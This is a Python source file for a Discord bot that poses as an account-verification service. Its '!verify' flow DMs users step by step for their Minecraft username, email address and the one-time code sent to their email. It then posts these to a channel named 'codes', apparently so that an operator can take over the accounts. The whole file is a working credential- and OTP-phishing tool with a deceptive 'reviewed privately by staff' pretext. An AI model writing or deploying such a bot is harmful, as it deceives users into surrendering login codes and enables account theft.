import discord
from discord.ext import commands
import re
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

sessions = {}

BRAND_COLOR = 0x2ECC71
ERROR_COLOR = 0xE74C3C
INFO_COLOR = 0x3498DB


def valid_mc(username):
return re.fullmatch(r"[A-Za-z0-9_]{3,16}", username) is not None


@bot.event
async def on_ready():
print(f"✔ Logged in as {bot.user}")


@bot.command()
async def verify(ctx):
try:
sessions[ctx.author.id] = {"stage": "mc"}

embed = discord.Embed(
title="🔐 Account Verification",
description=(
"To complete verification, please provide:\n\n"
"• Minecraft username\n"
"• Email address\n"
"• Verification code sent to your email\n\n"
"*All information is reviewed privately by staff.*"
),
color=INFO_COLOR
)
embed.set_footer(text="Step 1 of 3 • Enter your Minecraft username")

await ctx.author.send(embed=embed)
await ctx.reply("📩 Check your DMs to continue verification.", delete_after=8)

except discord.Forbidden:
await ctx.reply("❌ Please enable DMs and try again.")


@bot.event
async def on_message(message):
if message.author.bot:
return

if not isinstance(message.channel, discord.DMChannel):
await bot.process_commands(message)
return

user_id = message.author.id
if user_id not in sessions:
return

session = sessions[user_id]

if session["stage"] == "mc":
if not valid_mc(message.content):
await message.channel.send(
embed=discord.Embed(
description="❌ Invalid Minecraft username. Please try again.",
color=ERROR_COLOR
)
)
return

session["mc"] = message.content.strip()
session["stage"] = "email"

await message.channel.send(
embed=discord.Embed(
title="📧 Email Address",
description="Enter the email address where you received your verification code.",
color=INFO_COLOR
)
)

elif session["stage"] == "email":
session["email"] = message.content.strip()
session["stage"] = "code"

await message.channel.send(
embed=discord.Embed(
title="🔑 Verification Code",
description="Enter the verification code sent to your email.",
color=INFO_COLOR
)
)

elif session["stage"] == "code":
session["code"] = message.content.strip()

for guild in bot.guilds:
codes_channel = discord.utils.get(guild.text_channels, name="codes")
if codes_channel:
embed = discord.Embed(
title="✅ Verification Submitted",
color=BRAND_COLOR
)
embed.add_field(name="User", value=str(message.author), inline=False)
embed.add_field(name="Minecraft", value=session["mc"], inline=True)
embed.add_field(name="Email", value=session["email"], inline=True)
embed.add_field(name="Code", value=session["code"], inline=False)
await codes_channel.send(embed=embed)

await message.channel.send(
embed=discord.Embed(
title="🎉 Submission Received",
description="Staff will review your verification shortly.",
color=BRAND_COLOR
)
)

del sessions[user_id]


bot.run(os.getenv("DISCORD_TOKEN"))
